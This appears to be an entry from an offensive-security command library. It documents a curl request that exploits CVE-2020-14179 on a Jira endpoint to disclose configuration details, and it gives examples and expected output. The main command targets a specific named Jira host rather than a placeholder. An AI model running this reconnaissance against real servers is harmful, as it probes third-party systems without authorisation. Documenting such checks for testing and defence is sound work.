---
data: 'curl -k -v "https://jira.theendlessweb.com/secure/QueryComponent!Default.jspa"'
tags:
  - reconnaissance
  - information-disclosure
  - web
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2024-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:13.021Z'
id: 6df041cf-c2ed-4921-8cfb-8d4837bccdcf
verified: false
validated: true
submitted: true
---
# curl-jira-querycomponent

## Command

```bash
curl -k -v "https://jira.theendlessweb.com/secure/QueryComponent!Default.jspa"
```

## Description

This command uses curl to perform an unauthenticated GET request to the vulnerable Jira endpoint, exploiting CVE-2020-14179 to disclose configuration details. It is used in reconnaissance to gather software-specific information from public-facing web applications.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-k` | Ignore SSL certificate validation (useful for self-signed certs) | No |
| `-v` | Verbose mode to show request/response headers | No |
| URL | Target endpoint (e.g., https://target.com/secure/QueryComponent!Default.jspa) | Yes |

## Examples

### Basic Usage

```bash
curl -k "https://jira.example.com/secure/QueryComponent!Default.jspa"
```

### Advanced Usage

```bash
curl -k -v "https://jira.example.com/secure/QueryComponent!Default.jspa" | grep -i customfield
```

## Expected Output

A successful run returns HTTP 200 with HTML content exposing Jira internals, such as:

* Connected to jira.example.com (93.184.216.34) port 443
* < HTTP/1.1 200 OK
* <option value="customfield_10010">Impact</option>
* SLA configurations in query components.

If patched, expect 401/403 or redirect to login.

## Related

- [[Related Procedure|procedures/Exploit-CVE-2020-14179-for-Jira-Configuration-Disclosure]]
